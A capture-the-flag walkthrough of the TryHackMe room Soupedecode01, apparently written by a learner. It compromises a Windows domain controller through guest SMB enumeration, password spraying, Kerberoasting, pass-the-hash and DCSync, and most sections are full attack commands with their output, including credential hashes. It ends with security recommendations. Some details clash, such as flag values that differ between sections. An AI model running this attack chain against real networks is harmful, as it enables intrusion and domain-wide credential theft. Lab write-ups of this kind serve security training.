# Soupedecode01 — TryHackMe Walkthrough

**Platform:** TryHackMe  

**Room:** Soupedecode01  

**Difficulty:** Easy  

**Target OS:** Windows Server 2022 (Active Directory Domain Controller)  

**Kill Chain:** Guest SMB Recon → RID Cycling → Credential Spraying → Kerberoasting → Backup Share Loot → Pass-the-Hash → DCSync → Full Domain Takeover  

---

## 1. Reconnaissance

Kicked off the engagement with an Nmap sweep to map out every reachable port and its associated service. The results made it obvious we were dealing with a Windows Active Directory Domain Controller.

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-09-27 09:31:30Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
49664/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49740/tcp open  unknown       syn-ack
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49400/tcp): CLEAN (Timeout)
|   Check 2 (port 47088/tcp): CLEAN (Timeout)
|   Check 3 (port 48186/udp): CLEAN (Timeout)
|   Check 4 (port 12908/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.

```

**Exposed Ports:**

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MSRPC |
| 139 | NetBIOS-SSN |
| 389 | LDAP |
| 445 | SMB |
| 464 | kpasswd5 |
| 593 | HTTP-RPC |
| 636 | LDAPS |
| 3268 | Global Catalog LDAP |
| 3269 | Global Catalog LDAPS |
| 3389 | RDP |
| 9389 | ADWS |

**Domain Controller Info:**
- **FQDN:** `DC01.SOUPEDECODE.LOCAL`
- **Domain:** `SOUPEDECODE.LOCAL`
- **NetBIOS Name:** `DC01`

Added the hostname resolution entry to `/etc/hosts`:

```

echo "$IP DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL DC01" | sudo tee -a /etc/hosts

```

No HTTP service was present, so the entire focus shifted to AD-focused enumeration and abuse.

---

## 2. Enumeration — Guest Access & RID Cycling

### 2.1 Guest Account Access

A quick check confirmed the **Guest** account was live and accepted a blank password over SMB:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ nxc smb $IP -u guest -p ''
SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest:

```

**Response:**
```
[+] SOUPEDECODE.LOCAL\guest:

```

### 2.2 Share Discovery

Leveraging the Guest account, the available SMB shares were listed:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ nxc smb $IP -u guest -p '' --shares
SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.129.188.79   445    DC01             [*] Enumerated shares
SMB         10.129.188.79   445    DC01             Share           Permissions     Remark
SMB         10.129.188.79   445    DC01             -----           -----------     ------
SMB         10.129.188.79   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.188.79   445    DC01             backup                          
SMB         10.129.188.79   445    DC01             C$                              Default share
SMB         10.129.188.79   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.188.79   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.188.79   445    DC01             SYSVOL                          Logon server share 
SMB         10.129.188.79   445    DC01             Users

```

**Visible Shares:**

| Share | Permissions |
|-------|-------------|
| ADMIN$ | – |
| backup | – |
| C$ | – |
| IPC$ | READ |
| NETLOGON | – |
| SYSVOL | – |
| Users | – |

Guest was only granted READ on `IPC$`, but that was enough to perform RID cycling.

### 2.3 RID Cycling — Harvesting Domain Users

Using the Guest account, a RID brute-force pulled down every domain object:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ nxc smb $IP -u guest -p '' --rid-brute 3000 | tee rid_brute.txt
SMB                      10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB                      10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB                      10.129.188.79   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      10.129.188.79   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      10.129.188.79   445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      10.129.188.79   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB                      10.129.188.79   445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.188.79   445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)

```

This surfaced **600+ user accounts** — including service accounts and machine accounts. The output was then filtered to a clean username list:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ cat rid_brute.txt | awk '{print $6}' | cut -d '\' -f2 > valid_users.txt

```

**Notable accounts found:**
- `file_svc` (RID 1133) — Service account
- `charlie` (RID 1134) — Non-standard username
- `firewall_svc` (RID 2163)
- `backup_svc` (RID 2164)
- `web_svc` (RID 2165)
- `monitoring_svc` (RID 2166)
- `admin` (RID 2168)
- `ybob317` (RID 1132)

---

## 3. Initial Access — Credential Spraying

### 3.1 Username-as-Password Spray

With a solid user list in hand, the next move was spraying credentials. The classic "username equals password" misconfiguration was tested against every account using Kerbrute:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ kerbrute passwordspray --domain SOUPEDECODE.LOCAL --dc $IP --user-as-pass valid_users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/27/26 - Ronnie Flathers @ropnop

2026/09/27 12:20:41 >  Using KDC(s):
2026/09/27 12:20:41 >  	10.129.188.79:88

2026/09/27 12:20:41 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317

```

**Result:**
```

2026/09/27 12:20:41 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317

```

A working credential pair emerged: **`ybob317:ybob317`**

---

## 4. Lateral Movement — Authenticated Enumeration

### 4.1 Enumerating Shares as ybob317

Re-listed the shares using the new credential:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ nxc smb $IP -u ybob317 -p 'ybob317' --shares
SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.129.188.79   445    DC01             [*] Enumerated shares
SMB         10.129.188.79   445    DC01             Share           Permissions     Remark
SMB         10.129.188.79   445    DC01             -----           -----------     ------
SMB         10.129.188.79   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.188.79   445    DC01             backup                          
SMB         10.129.188.79   445    DC01             C$                              Default share
SMB         10.129.188.79   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.188.79   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.188.79   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.188.79   445    DC01             Users           READ

```

The **`Users`** share was now reachable. Connected and browsed:

```

smbclient //$IP/Users -U ybob317

```

Inside `ybob317\Desktop`, the user flag was sitting in plain sight:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ smbclient -U ybob317 //$IP/Users 
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jul  4 23:48:22 2024
  ..                                DHS        0  Sun Sep 27 12:14:49 2026
  admin                               D        0  Thu Jul  4 23:49:01 2024
  Administrator                       D        0  Fri Jul 25 18:45:10 2025
  All Users                       DHSrn        0  Sat May  8 08:26:16 2021
  Default                           DHR        0  Sun Jun 16 03:51:08 2024
  Default User                    DHSrn        0  Sat May  8 08:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 08:14:03 2021
  Public                             DR        0  Sat Jun 15 18:54:32 2024
  ybob317                             D        0  Mon Jun 17 18:24:32 2024

		12942591 blocks of size 4096. 10789679 blocks available
smb: \> cd ybob317/Desktop
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Fri Jul 25 18:51:44 2025
  ..                                  D        0  Mon Jun 17 18:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 18:24:32 2024
  user.txt                            A       33  Fri Jul 25 18:51:44 2025

		12942591 blocks of size 4096. 10789679 blocks available
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

```

**User Flag:** `28189316c25dd3c0ad56d44d000d62a8`

### 4.2 Kerberoasting

With a foothold secured, Kerberoasting pulled service account TGS tickets:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip $IP -request -outputfile roasted.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 18:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 18:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 18:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 18:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
```

The extracted hash was fed to John the Ripper:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ hashcat roasted.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$44246eb2bf1573507f9e98a68d60dd8b$5ffe87889b3aefe74f1699909555eed943ef1aae4ed226a077c4b630b5101aa574be9a43a4e671aa3d7bd2afebce0d0e8c03e1be2ea5c6d6dfb4764264e156d9d6d7b9ba3c15d0a606476211d818bbba75c91123498687300f5158f72dfc14294df15359f06e6a5cc277a0f2a95e92b1364256576010f04409012efc51c861648ee1dac49e2619f2586e48cadf2bdab6ea4d82f8c425e2b13eace377fba359ee6869766564ed70b46854d976eeda49267ffccff3b57ce66e598661c604d96389b815e06753273324421f3a327f98ac72aa43f2746f59ef6f129c580173be6d89e341e243209560c4678361aeeb2ea07f6c7ccc8be99bb79d11301cdf620c93ada1b28ed4957fbcf741647bd96081c1d4de9368b96462fe1513f3fee7ed2f8366136d82a7534c6e5ebd5afd52d9b978720b3fe601394ffcd03e30e8f489cea4269293ef2cf4fc21ebf1e9448f99810519931b8fc81753995a6e0b2651e045a519898ae3582a32db36357a59f0221c55e8c5e16b6296c60e740b2a4f5135bed0023342f4991eceb81159413bfd1f9869734ae0f370b71aabaaa45395c7fddf167a95bcf1be340abea80ec1d25898765165e8264443e215c39083e1ec61c51fedc1ebbe5b46cc86b7fb691c50a41624d516413e667a3a7a92917fba5a9a25146f3ebd50a7b0af38f91ce2e9e7b497c4f50fe041bea7215e4c06d63c57c5540f8952680bd12a68b37aa31aded7888376b84d1e0bb5e3f8ee8bec7bf25604129f4084f005606141bf3efb4232c04594a75ac9257dcd934a64eaa6786c209231f3d615e5b8101cbdf27ae97733938ae4af3dc35ec2e68fffacc1ea91493b5be79ffb405d939e8fb549868ff4f7e832419d46cf058abee962ab9b6ec30d054a582b46252d732c8e0d7441498b35d15ee44bd07630fe8b272f0dffd26c7639daaeea02719f2e03e2e079822d7cbd72f794940df9c50b6c0a57efb0109bf8cf539d977c0928b447b311d980893afbfe6d16e5032147c67bc04ce32e57132cf804161ff5244be59481bd7a2a324529628ab936438d023d3dafc0a6b19dd062d4a3cac8a7da81ffc43723c1eff260962e27b080c10b489a4983bad205835b8916dfca620413a84bbecdf37ae13ec2311a017def1e08c52b072a10b4b7f6c47c8ddb7c8f995f1668928f2fdc6ba55bcbbdcbc0e57a2611ee4ccfec0004fdbb993e031b6932daef396e539ac4ccb08bda2e4b538a2934c454b3c37fa2726ffab517da52a8f213483fcb66ef79d749057be99c6711c95079a6af203b0abf32d13cec64afba826a8ac65f83e15c4210e6ffee5b0f44c5ef1ecae610856bed1e0e41d0a05c8e8b62f71a132405b55ee06988ae1a849b4cf288f06f035a05e3454d3eeaf934e6845303effc05be16b4a07f463c727e882529848a460a42c53dfae70b6ce1d7ea5c33c6ef82e234f4a346b35c5434eb291b97c04ad7bb34d0b72d25042c3a66fc41ed1d:Password123!!
```

The cracked plaintext belonged to the **`file_svc`** account:

**Recovered Credentials:**
```
file_svc : Password123!!
```

---

## 5. Privilege Escalation — Backup Share Loot & Pass-the-Hash

### 5.1 Digging Into the Backup Share

With the `file_svc` credentials, the previously hidden **`backup`** share became reachable:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ smbclient //$IP/backup -U file_svc 
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 18:41:17 2024
  ..                                 DR        0  Fri Jul 25 18:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 09:41:05 2024

		12942591 blocks of size 4096. 10800021 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)

```

A file named **`backup_extract.txt`** was sitting inside. Reading it revealed a full set of NTLM hashes for domain accounts:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```

**Extracted hashes (sample):**

```

WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::


```

### 5.2 Preparing Hashes for Pass-the-Hash

Split the loot into usernames and hashes for spraying:

```
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt

```

Machine accounts, `admin`, and `Administrator` were added to the list, then a Pass-the-Hash spray was launched:

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ nxc smb $IP -u extracted_users.txt -H ntlm-hashes.txt -d SOUPEDECODE.LOCAL --no-bruteforce --continue-on-success
SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\MailServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE 
SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE

```

**Valid Hash Found:**

```

SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559

```

The machine account **`FileServer$`** was over-privileged on the DC — a serious misconfiguration.

### 5.3 Evil-winrm to FileServer$

```

┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ evil-winrm -i 10.130.189.216 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents> ls
*Evil-WinRM* PS C:\Users> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         7/25/2025  10:51 AM             33 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
27cb2be302c388d63d27c86bfdd5f56a
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 


```

**Root Flag:** `27cb2be302c388d63d27c86bfdd5f56a`

---

## 6. Post-Exploitation — DCSync & Full Domain Control

### 6.1 DCSync as FileServer$

Because `FileServer$` packed DCSync privileges, the entire domain's credentials were dumped:

<img width="971" height="613" alt="image" src="https://github.com/user-attachments/assets/06e6e38e-7178-4bc1-bb63-ea2a3b3e524c" />


```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ impacket-secretsdump 'soupedecode.local/FileServer$@$IP' -hashes :e41da7e79a4c76dbd9cf79d1cb325559  -just-dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::```
```
**Result:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
```

`FileServer$` had DCSync rights — game over for the domain.

### 6.2 Full Administrative Control

Using the Administrator's NTLM hash, a SYSTEM shell was obtained through `wmiexec`:

```
┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
└──╼ $ impacket-wmiexec soupedecode.local/Administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\

09/27/2026  05:17 AM    <DIR>          badr
05/08/2021  01:15 AM    <DIR>          PerfLogs
06/15/2024  10:54 AM    <DIR>          Program Files
05/08/2021  02:34 AM    <DIR>          Program Files (x86)
07/04/2024  03:48 PM    <DIR>          Users
09/27/2026  06:00 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  44,234,141,696 bytes free

C:\>whoami
soupedecode\administrator

```

## 7. Flags

| Flag | Value |
|------|-------|
| **User Flag** | `28189316c25dd3c0ad6d44d000d62a8` |
| **Root Flag** | `27cb2be302c388d63d7c86bfdd5f56a` |

---

## 8. Security Findings & Recommendations

### Findings

| Finding | Impact |
|---------|--------|
| Guest account enabled with a blank password | Permitted anonymous SMB enumeration and RID cycling |
| Weak password policy (username used as password) | Enabled trivial credential discovery |
| Kerberoastable service accounts | Permitted offline cracking of service account secrets |
| Sensitive NTLM hashes stored in backup share | Enabled Pass-the-Hash attacks |
| Over-privileged machine account (FileServer$) | Paved the way to DCSync and full domain takeover |
| DCSync rights granted to non-admin account | Permitted extraction of every domain hash |

### Recommendations

1. **Disable the Guest Account:** Prevent anonymous enumeration entirely.
2. **Enforce Strong Password Policies:** Block username-as-password patterns with complexity rules and regular audits.
3. **Secure Service Accounts:** Migrate Kerberoastable accounts to gMSAs with 240-character random passwords.
4. **Protect Sensitive Data in Shares:** Never place NTLM hashes, credential dumps, or backup files in reachable SMB shares.
5. **Apply Least Privilege:** Strip DCSync rights from non-administrative accounts and machine accounts.
6. **Monitor DCSync Activity:** Alert on replication requests originating from non-DC principals.

---
